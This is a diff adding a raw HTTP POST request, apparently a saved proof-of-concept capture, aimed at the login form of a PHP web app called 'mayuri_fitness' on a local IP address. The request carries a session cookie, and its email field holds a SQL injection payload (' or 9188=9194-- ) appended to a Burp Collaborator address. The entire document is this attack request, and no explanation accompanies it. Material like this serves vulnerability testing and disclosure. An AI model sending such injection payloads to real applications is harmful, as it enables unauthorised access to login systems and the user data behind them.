@@ -1,0 +1,16 @@
+POST /mayuri_fitness/mayuri_fitness/ HTTP/1.1
+Host: 192.168.1.180
+Origin: http://192.168.1.180
+Cookie: PHPSESSID=bjee837emf2g0bojn937uf0toi
+Upgrade-Insecure-Requests: 1
+Referer: http://192.168.1.180/mayuri_fitness/mayuri_fitness/
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Content-Length: 85
+
+email=csZzeKHa@burpcollaborator.net66072898'%20or%209188%3d9194--%20&password=p0O%21n8w%21E9&btn_login=%C2%9E%C3%A9e
